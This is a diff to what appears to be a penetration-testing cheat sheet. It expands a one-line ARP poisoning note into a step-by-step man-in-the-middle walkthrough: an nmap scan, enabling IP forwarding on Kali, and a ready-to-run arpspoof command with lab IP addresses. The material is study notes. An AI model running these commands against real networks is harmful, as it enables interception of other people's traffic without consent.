@@ -32,9 +32,21 @@ tshark -i
 
 
 
-# ARP Poisoning.
-# arpspoof -i <interface> -t <targetIP> -r <localIP> #Perform an ARP spoofing attack
+# ARP Poisoning / MITM attack
+# Here we deceive the client into thinking we are the server, and also deceive the server into thinking we are the client.
 
+# step 1
+# discover host in the network.
+nmap 192.168.0.1/24 # scan the network and discover the server and client you want to deceive.
+
+# step 2
+# convert kali into a router, so it can start sniffing packets.
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# step 3
+# run the attack with arpspoof utility.
+# arpspoof -i <interface> -t <target_Client_IP> -r <target_Server_IP> # Perform an ARP spoofing attack
+arpspoof -i eth1 -t 10.100.13.37 -r 10.100.13.36
 
 ```
 {% endcode %}
